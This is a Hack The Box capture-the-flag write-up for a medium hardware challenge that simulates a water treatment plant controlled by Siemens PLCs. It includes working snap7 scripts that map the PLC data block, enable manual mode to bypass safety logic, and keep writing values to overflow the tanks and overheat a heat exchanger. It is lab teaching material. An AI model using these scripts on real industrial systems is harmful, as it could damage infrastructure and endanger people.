---
type: challenge
platform: Hack The Box
category: "hardware"
difficulty: "medium"
status: Documents
date_started: 2026-03-06
date_completed: 2026-03-06
tags:
  - htb
  - challenge
  - ics
  - scada
  - s7comm
  - snap7
  - plc
  - siemens
  - water_treatment
---

# Flow Override

## Overview

**Category:** hardware
**Difficulty:** medium
**Platform:** Hack The Box
**Date:** 2026-03-06

> [!note] Challenge Scenario
>
> > A trusted friend gives you full access to his water treatment plant for a security test. The Siemens PLCs use S7comm — Can you break in and disrupt at least three pieces of equipment?

Two endpoints provided:
- **$RHOST:30088** — S7comm PLC (Siemens CPU 315-2 PN/DP)
- **$RHOST:32570** — Web HMI (Flask/Werkzeug)

## Enumeration

### Web HMI Reconnaissance (Port 32570)

The web interface served an SVG diagram of a water treatment plant with a `/status` JSON API endpoint. JavaScript on the page polled `/status` every second and displayed real-time plant state. Crucially, the code contained:

```javascript
if (ret.flag) { alert(ret.flag); }
```

This revealed that the flag would be returned via the status API when win conditions were met.

### Plant Components

The water treatment plant has 5 pieces of equipment, each with a health status:

| #  | Equipment        | Key Parameters                              |
| -- | ---------------- | ------------------------------------------- |
| 1  | **In-Water Tank** | input/output valves, fill percentage        |
| 2  | **Chlorine Tank** | input/output valves, fill percentage        |
| 3  | **Heat Exchanger** | hot/cold side valves, temperature readings |
| 4  | **Mixer Tank**   | mixing speed, duration, volume, fill percentage |
| 5  | **Storage Tank** | input/output valves, fill percentage        |

The `/status` endpoint returned JSON with all parameters including `manual_mode`, valve states, fill percentages, temperatures, and equipment status strings (e.g., `"healthy"`, `"over flow"`, `"over heat"`). The `flag` field was empty until win conditions were met.

## Vulnerability

### S7comm PLC Connection (Port 30088)

Connected to the Siemens PLC using `python-snap7`:

```python
import snap7
client = snap7.client.Client()
client.connect('$RHOST', 0, 1, 30088)  # rack=0, slot=1
```

### PLC Memory Mapping via Byte-by-Byte Fuzzing

Read Data Block 1 (DB1) — 200 bytes. Performed systematic byte-by-byte enumeration: wrote value `1` to each byte individually, checked the `/status` API for changes, then reset the byte to `0`. This revealed the full control mapping:

| DB1 Byte | Control Parameter | Type |
| -------- | ----------------- | ---- |
| 0        | `water_tank_in_valve` | Boolean |
| 1        | `water_tank_out_valve` | Boolean |
| 4        | `manual_mode` | Boolean |
| 10       | `chlorine_tank_in_valve` | Boolean |
| 11       | `chlorine_tank_out_valve` | Boolean |
| 33       | `mixer_mixing_speed` | Integer (capped at 100) |
| 39       | `mixer_mixing_duration` | Integer |
| 49       | `heatexch_hot_side_temp` | Integer |
| 62       | `heatexch_hot_side_valve` | Boolean |
| 63       | `heatexch_cold_side_valve` | Boolean |

## Exploitation

### Attack Strategy

The goal was to disrupt at least 3 pieces of equipment simultaneously. The attack used persistent writes (similar to the Steel Mountain HTB challenge pattern) to overcome any automatic safety resets.

### Attack Steps

1. **Enable Manual Mode**: Set byte 4 = 1 to prevent the PLC's automatic safety logic from correcting values.

2. **Water Tank Overflow**: Set byte 0 = 1 (open input valve), byte 1 = 0 (close output valve). Water accumulated with no drainage, filling to 100% → status changed to **"over flow"**.

3. **Heat Exchanger Overheat**: Set byte 49 = 255 (hot side temperature to maximum). The current temperature rose from ~60°C to 103.5°C → status changed to **"over heat"**.

4. **Chlorine Tank Overflow**: Set byte 10 = 1 (open input valve), byte 11 = 0 (close output valve). Chlorine accumulated to 100% → status changed to **"over flow"**.

### Solve Script

```python
#!/usr/bin/env python3
"""
Flow Override — S7comm PLC exploitation
Disrupt 3+ equipment in a water treatment plant via Data Block manipulation
"""

import snap7
import json
import urllib.request
import time

HOST = '$RHOST'
S7_PORT = 30088
HMI_PORT = 32570

client = snap7.client.Client()
client.connect(HOST, 0, 1, S7_PORT)

write_data = bytearray(1)

for i in range(30):
    # Manual mode ON — disable safety logic
    write_data[0] = 1
    client.db_write(1, 4, write_data)

    # Water tank: open input, close output -> overflow
    write_data[0] = 1
    client.db_write(1, 0, write_data)
    write_data[0] = 0
    client.db_write(1, 1, write_data)

    # Heat exchanger: max temperature -> overheat
    write_data[0] = 255
    client.db_write(1, 49, write_data)

    # Chlorine tank: open input, close output -> overflow
    write_data[0] = 1
    client.db_write(1, 10, write_data)
    write_data[0] = 0
    client.db_write(1, 11, write_data)

    time.sleep(2)

    with urllib.request.urlopen(f'http://{HOST}:{HMI_PORT}/status') as resp:
        status = json.loads(resp.read())

    print(f"[{i}] Water: {status.get('water_tank_fill', '?')}% / {status.get('water_tank_status', '?')}")
    print(f"     Chlorine: {status.get('chlorine_tank_fill', '?')}% / {status.get('chlorine_tank_status', '?')}")
    print(f"     HeatExch: {status.get('heatexch_hot_side_temp', '?')}°C / {status.get('heatexch_status', '?')}")

    if status.get('flag'):
        print(f"\nFLAG: {status['flag']}")
        break

client.disconnect()
```

### Enumeration Script (for memory mapping)

```python
#!/usr/bin/env python3
"""
Byte-by-byte DB1 enumeration to reverse-engineer PLC memory layout
"""

import snap7
import json
import urllib.request
import time

client = snap7.client.Client()
client.connect('$RHOST', 0, 1, 30088)

def get_status():
    with urllib.request.urlopen(f'http://$RHOST:32570/status') as resp:
        return json.loads(resp.read())

baseline = get_status()

for byte_offset in range(200):
    # Write 1 to this byte
    data = bytearray(1)
    data[0] = 1
    client.db_write(1, byte_offset, data)

    time.sleep(0.5)
    current = get_status()

    # Compare with baseline
    changes = {k: (baseline[k], current[k]) for k in baseline
               if baseline[k] != current[k] and k != 'flag'}

    if changes:
        print(f"Byte {byte_offset}: {changes}")

    # Reset byte
    data[0] = 0
    client.db_write(1, byte_offset, data)
    time.sleep(0.3)

client.disconnect()
```

### Result

On the very first check after writing all attack values, 3 equipment were disrupted simultaneously:
- **Water Tank**: 100% / "over flow"
- **Chlorine Tank**: 100% / "over flow"
- **Heat Exchanger**: 103.5°C / "over heat"

> [!info] Tools Used
>
> - `python3`
> - `snap7`
> - `urllib`

## Key Techniques

1. **S7comm Protocol Exploitation**: Using `python-snap7` to connect to Siemens PLCs and read/write Data Blocks without authentication
2. **PLC Data Block Fuzzing**: Systematic byte-by-byte enumeration — write a test value, observe HMI changes, reset — to reverse-engineer memory layout without access to ladder logic
3. **Safety Logic Bypass**: Enabling `manual_mode` to prevent automatic safety corrections
4. **Persistent ICS Writes**: Looping writes to maintain attack state against safety system resets
5. **Multi-Equipment Simultaneous Disruption**: Coordinating overflow/overheat attacks across multiple subsystems in a single write loop

## Lessons Learned

- **S7comm has no authentication by default** — any client can read/write PLC data blocks
- **ICS/SCADA safety logic** often tries to reset dangerous values, requiring persistent attack writes in a loop
- **HMI web interfaces leak control structure** — the `/status` API exposed all parameters, making it trivial to verify attack effects
- **Byte-by-byte enumeration** is an effective way to reverse-engineer PLC memory layouts without access to the PLC program/ladder logic
- **Manual mode** is a common ICS feature that, when enabled, disables automatic safety corrections — always check for it first

## Flag

`HTB{...}`

## References

- [python-snap7](https://python-snap7.readthedocs.io/) — S7comm client library for Python
- [Siemens S7comm Protocol](https://wiki.wireshark.org/S7comm) — Wireshark protocol documentation
- Similar challenge: [Steel Mountain (HTB)](./Steel Mountain.md) — BACnet BMS exploitation with persistent writes